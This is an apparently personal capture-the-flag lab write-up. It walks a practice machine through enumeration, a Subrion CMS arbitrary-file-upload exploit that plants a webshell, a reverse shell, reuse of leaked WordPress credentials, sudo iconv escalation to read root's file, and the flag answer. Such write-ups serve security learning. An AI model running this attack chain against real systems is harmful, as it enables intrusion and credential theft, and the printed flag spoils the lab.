---
Hack into the scammer's under-development website to foil their plans.
---

![](https://lh3.googleusercontent.com/fife/AAWUweXoOnrHJUw8OzY-RhVIfNPjcqcIQBRE5HFe8lPvGYoqjAqppyExVufesL5OO9nsw1gok0r0oLYpO4kDNv2hOjJLPOzoJ9KhIU-jfOXGM-Q0qa7imhEqTX5yNpK2cJ6BRwphx2VSOxTrMzsv5jFmxkA_XdtZioSBUPxpAbSG0EzD3XT6Gzk10l8AGscOevb7OOqX-Sp2J-xu5RctrEWpyM3suLK2Uu8bIFPnGbVHuM6Z1zOZ7ib6CggPoWFAqJmaPFLp-nId9_T9L0DDdq1D7pAUoLppk3n1z0clq4VUoIuZetd2x5aVvC9r63s7kLX5KGs6hNKTscng1KfzhwttU80CGRR_QmMqoUxzcxFXF3-ExsOrC2oDoqvhuEM-ntHpUKzMJRqIQm0FX1FhCxpwfaKyJVBZxnVwE8M8cbLM5MbIdy-dN4LVRN99_TeDTnjxZpGhnTnYECAP8u_4xKn02hOHOAraqX7cTom6D6CUeoNE-14yFXHOF9pVzq4Pz-6NxNZr0bPFiM5149cEc-0CAS4EBQPVIewgPIhYSyZksAM48uBmZe-o-ZW51EnnNThs18dLgKeu23ggPj8Yg_BVx0g3EfAhIyHTSOAH0Hv24NEiUpzLVX--d-yPfFQDJhrEtxV8l8ViK53jCLXiIy5SajyI7vwilbpSlAKG31_N0tmBmTt_3K1f4at7VZaMZFgZPi9j-TItzKUdMYdMpTXL5aZ4bvCbIH7JFnI=w2880-h1426-ft)

Hack into the machine and investigate the target.


```
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ nmap -sC -sV 10.10.61.64                   
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-24 15:16 EDT
Nmap scan report for 10.10.61.64
Host is up (0.20s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
|_  256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2022-09-24T19:17:29
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2022-09-25T00:47:30+05:30
|_clock-skew: mean: -1h50m00s, deviation: 3h10m30s, median: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.48 seconds
zsh: segmentation fault  nmap -sC -sV 10.10.61.64

ssh, http, smb port 139 and 445

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ ping 10.10.61.64  
PING 10.10.61.64 (10.10.61.64) 56(84) bytes of data.
64 bytes from 10.10.61.64: icmp_seq=1 ttl=63 time=196 ms
64 bytes from 10.10.61.64: icmp_seq=2 ttl=63 time=194 ms
64 bytes from 10.10.61.64: icmp_seq=4 ttl=63 time=195 ms
64 bytes from 10.10.61.64: icmp_seq=5 ttl=63 time=195 ms
64 bytes from 10.10.61.64: icmp_seq=6 ttl=63 time=196 ms
64 bytes from 10.10.61.64: icmp_seq=7 ttl=63 time=195 ms
^C
--- 10.10.61.64 ping statistics ---
7 packets transmitted, 6 received, 14.2857% packet loss, time 6032ms
rtt min/avg/max/mdev = 193.894/195.072/196.053/0.677 ms

There is a small trick to identify the OS (operating system) without nmap by using ping (yes ping) . By checking the ttl (Time to live) by default windows has a ttl(Time to live) of 128 and for Linux it’s something in the range of 64.



┌──(kali㉿kali)-[~/Downloads]
└─$ feroxbuster --url http://10.10.61.64 -w /usr/share/wordlists/dirb/common.txt -t 60 -C 404,403

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.61.64
 🚀  Threads               │ 60
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 💢  Status Code Filters   │ [404, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      375l      968w    11321c http://10.10.61.64/
200      GET      375l      968w    11321c http://10.10.61.64/index.html
200      GET     1165l     5849w        0c http://10.10.61.64/phpinfo.php
301      GET        9l       28w      309c http://10.10.61.64/test => http://10.10.61.64/test/
301      GET        9l       28w      314c http://10.10.61.64/wordpress => http://10.10.61.64/wordpress/
200      GET      405l     1290w    20677c http://10.10.61.64/test/index.html
200      GET      354l     1149w        0c http://10.10.61.64/wordpress/index.php
301      GET        9l       28w      323c http://10.10.61.64/wordpress/wp-admin => http://10.10.61.64/wordpress/wp-admin/

but the page is not found maybe a rabbit hole

checking SMB

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ smbmap -H 10.10.61.64   

[+] Guest session       IP: 10.10.61.64:445     Name: 10.10.61.64                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        websvr                                                  READ ONLY
        IPC$                                                    NO ACCESS       IPC Service (TechSupport server (Samba, Ubuntu))

websvr read only

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ smbclient -N //10.10.61.64/websvr
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat May 29 03:17:38 2021
  ..                                  D        0  Sat May 29 03:03:47 2021
  enter.txt                           N      273  Sat May 29 03:17:38 2021

                8460484 blocks of size 1024. 5694748 blocks available
smb: \> get *
NT_STATUS_OBJECT_NAME_INVALID opening remote file \*
smb: \> mget *
Get file enter.txt?

let's see the txt

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ smbclient -N //10.10.61.64/websvr
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat May 29 03:17:38 2021
  ..                                  D        0  Sat May 29 03:03:47 2021
  enter.txt                           N      273  Sat May 29 03:17:38 2021
g
                8460484 blocks of size 1024. 5694748 blocks available
smb: \> get enter.txt
getting file \enter.txt of size 273 as enter.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> exit


┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ cat enter.txt      
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
Wordpress creds
|->

directory /subrion -> admin:Scam2021 (cyberchef magic wand 7sKvntXdPEJaxazce9PXi24zaFrLiKWCk)

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ searchsploit Subrion CMS         
----------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- ---------------------------------
SUBRION CMS - Multiple Vulnerabilities                                 | php/webapps/17390.txt
Subrion CMS 2.2.1 - Cross-Site Request Forgery (Add Admin)             | php/webapps/21267.txt
subrion CMS 2.2.1 - Multiple Vulnerabilities                           | php/webapps/22159.txt
Subrion CMS 4.0.5 - Cross-Site Request Forgery (Add Admin)             | php/webapps/47851.txt
Subrion CMS 4.0.5 - Cross-Site Request Forgery Bypass / Persistent Cro | php/webapps/40553.txt
Subrion CMS 4.0.5 - SQL Injection                                      | php/webapps/40202.txt
Subrion CMS 4.2.1 - 'avatar[path]' XSS                                 | php/webapps/49346.txt
Subrion CMS 4.2.1 - Arbitrary File Upload                              | php/webapps/49876.py
Subrion CMS 4.2.1 - Cross Site Request Forgery (CSRF) (Add Amin)       | php/webapps/50737.txt
Subrion CMS 4.2.1 - Cross-Site Scripting                               | php/webapps/45150.txt
----------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

I am more interested in “Subrion CMS 4.2.1 — Arbitrary File Upload” because it’s easiest way to get initial foothold on the box . We can download the python script by using “-m” .

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ searchsploit -m php/webapps/49876.py
  Exploit: Subrion CMS 4.2.1 - Arbitrary File Upload
      URL: https://www.exploit-db.com/exploits/49876
     Path: /usr/share/exploitdb/exploits/php/webapps/49876.py
File Type: Python script, ASCII text executable, with very long lines (956)

Copied to: /home/kali/Downloads/hacker_vs_hacker/49876.py


http://10.10.61.64/subrion/panel/

log in


┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ python3 49876.py -u http://10.10.61.64/subrion/panel/ -l admin -p Scam2021
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

[+] Trying to connect to: http://10.10.61.64/subrion/panel/
[+] Success!
[+] Got CSRF token: JeYaMmUhd0XjKvfYbtaKT8qfu5ZZVYzDBKGfOLYI
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: cgundrkfjcimnip

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://10.10.61.64/subrion/panel/uploads/cgundrkfjcimnip.phar 

$ whoami
www-data

Another method

create a revshell .phar

┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ cp shell.php5 rev.phar

10.10.61.64/subrion/uploads/rev.phar
1337 (leet)
┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
└─$ rlwrap nc -nlvp 1337
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.61.64.
Ncat: Connection from 10.10.61.64:40986.
Linux TechSupport 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 01:10:45 up 35 min,  0 users,  load average: 0.00, 0.00, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")
> ls
> '
www-data@TechSupport:/$ ls
ls
bin   home            lib64       opt   sbin  tmp      vmlinuz.old
boot  initrd.img      lost+found  proc  snap  usr
dev   initrd.img.old  media       root  srv   var
etc   lib             mnt         run   sys   vmlinuz
www-data@TechSupport:/$ pwd
pwd
/
www-data@TechSupport:/$ cd /var/www
cd /var/www
www-data@TechSupport:/var/www$ ls
ls
html
www-data@TechSupport:/var/www$ cd html
cd html
www-data@TechSupport:/var/www/html$ ls
ls
index.html  phpinfo.php  subrion  test  wordpress
www-data@TechSupport:/var/www/html$ cd wordpress
cd wordpress
www-data@TechSupport:/var/www/html/wordpress$ ls
ls
index.php        wp-blog-header.php    wp-includes        wp-settings.php
license.txt      wp-comments-post.php  wp-links-opml.php  wp-signup.php
readme.html      wp-config.php         wp-load.php        wp-trackback.php
wp-activate.php  wp-content            wp-login.php       xmlrpc.php
wp-admin         wp-cron.php           wp-mail.php


www-data@TechSupport:/var/www/html/wordpress$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wpdb' );

/** MySQL database username */
define( 'DB_USER', 'support' );

/** MySQL database password */
define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/wordpress/' );
}

define('WP_HOME', '/wordpress/index.php');
define('WP_SITEURL', '/wordpress/');

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

www-data@TechSupport:/var/www/html/wordpress$ cd /home
cd /home
www-data@TechSupport:/home$ ls
ls
scamsite
www-data@TechSupport:/home$ cd scamsite
cd scamsite
www-data@TechSupport:/home/scamsite$ su scamsite
su scamsite
Password: ImAScammerLOL!123!

scamsite@TechSupport:~$ sudo -l
sudo -l
Matching Defaults entries for scamsite on TechSupport:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv

https://gtfobins.github.io/gtfobins/iconv/


scamsite@TechSupport:~$ sudo iconv -f 8859_1 -t 8859_1 "/root/root.txt"
sudo iconv -f 8859_1 -t 8859_1 "/root/root.txt"
851b8233a8c09400ec30651bd1529bf1ed02790b  -

```


![[Pasted image 20220924143129.png]]

![[Pasted image 20220924143905.png]]

![[Pasted image 20220924144133.png]]


What is the root.txt flag?
*851b8233a8c09400ec30651bd1529bf1ed02790b*





[[b3dr0ck]]